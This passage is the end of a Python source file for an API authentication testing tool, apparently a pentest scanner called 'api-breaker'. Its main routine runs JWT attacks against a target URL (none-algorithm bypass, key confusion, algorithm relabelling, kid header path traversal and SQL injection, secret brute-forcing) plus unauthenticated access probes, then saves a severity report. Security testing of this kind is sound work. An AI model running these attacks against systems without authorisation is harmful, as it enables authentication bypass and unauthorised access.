                "algorithm": decoded["header"].get("alg", "unknown"),
            }
            log(f"  Algorithm: {jwt_info['algorithm']}")
            log(f"  Claims: {list(decoded['payload'].keys())}")

            # Analyze claims
            claim_findings = analyze_jwt_claims(decoded)
            all_findings.extend(claim_findings)

            # Pick a test URL
            test_url = endpoints[0] if endpoints else base_url
            if test_url:
                invalid_status = invalid_jwt_control_status(
                    test_url, extra_headers, args.delay
                )
                # Test none algorithm bypass
                none_findings = test_jwt_none_bypass(
                    decoded, test_url, extra_headers, args.delay, invalid_status
                )
                all_findings.extend(none_findings)

                # Test key confusion
                confusion_findings = test_jwt_hs256_confusion(
                    decoded, test_url, extra_headers, args.delay, invalid_status
                )
                all_findings.extend(confusion_findings)

                # RS256<->PS256 relabeling (zero new crypto, pure header swap)
                relabel_findings = test_jwt_rs_ps_relabel(
                    decoded, test_url, extra_headers, args.delay, invalid_status
                )
                all_findings.extend(relabel_findings)

                # kid header injection: path traversal + SQLi
                kid_findings = test_jwt_kid_injection(
                    decoded, test_url, extra_headers, args.delay, invalid_status
                )
                all_findings.extend(kid_findings)
                if not args.skip_kid_timing:
                    kid_timing_findings = test_jwt_kid_sqli_timing(decoded, test_url, extra_headers, args.delay)
                    all_findings.extend(kid_timing_findings)

                # crit header non-enforcement (differential vs the none-alg bypass)
                crit_findings = test_jwt_crit_header_bypass(
                    decoded, test_url, extra_headers, args.delay, invalid_status
                )
                all_findings.extend(crit_findings)

                # Brute-force weak secrets
                bf_findings = brute_force_jwt_secret(
                    decoded, test_url, extra_headers, args.delay, invalid_status
                )
                all_findings.extend(bf_findings)

            if args.library:
                cve_hits = check_jwt_cve_fingerprint(args.library, args.library_version or "")
                for hit in cve_hits:
                    sev = {"hypothesis_version_matched": "high", "hypothesis_unversioned": "low",
                           "hypothesis_unknown_version": "low"}.get(hit["verdict"])
                    if sev:
                        all_findings.append({
                            "type": "jwt_library_cve", "severity": sev,
                            "cve": hit["cve"], "library": hit["library"], "version": hit["version"],
                            "verdict": hit["verdict"], "note": hit["note"],
                        })
        else:
            log("Token does not appear to be JWT, testing as API key")
            if endpoints:
                key_findings = test_api_key_positions(base_url, args.token, endpoints[:10], args.delay)
                all_findings.extend(key_findings)

    # Test no-auth access
    if endpoints:
        noauth_findings = test_no_auth_access(
            base_url, endpoints[:30], args.delay, args.token, extra_headers
        )
        all_findings.extend(noauth_findings)

    # Categorize findings
    critical = [f for f in all_findings if f.get("severity") == "critical"]
    high = [f for f in all_findings if f.get("severity") == "high"]
    medium = [f for f in all_findings if f.get("severity") == "medium"]
    low = [f for f in all_findings if f.get("severity") in ("low", "info")]

    output = {
        "meta": {
            "base_url": base_url,
            "timestamp": datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z'),
            "type": "auth_analysis",
            "tool": "api-breaker by orizon.one",
        },
        "stats": {
            "total_findings": len(all_findings),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "low": len(low),
            "endpoints_tested": len(endpoints),
        },
        "jwt_info": jwt_info,
        "findings": all_findings,
    }

    domain = urllib.parse.urlparse(base_url).hostname or "unknown" if base_url else "unknown"
    output_path = args.output or f"auth_analysis_{domain.replace('.', '_')}.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    success(f"Results saved to: {output_path}")

    print(f"\n{'='*60}")
    print(f"  AUTH ANALYSIS SUMMARY - {base_url}")
    print(f"{'='*60}")
    print(f"  JWT detected        : {'Yes' if jwt_info else 'No'}")
    if jwt_info:
        print(f"  JWT algorithm       : {jwt_info['algorithm']}")
    print(f"  Endpoints tested    : {len(endpoints)}")
    print(f"  Total findings      : {len(all_findings)}")
    print(f"  Critical            : {len(critical)}")
    print(f"  High                : {len(high)}")
    print(f"  Medium              : {len(medium)}")
    print(f"  Low/Info            : {len(low)}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
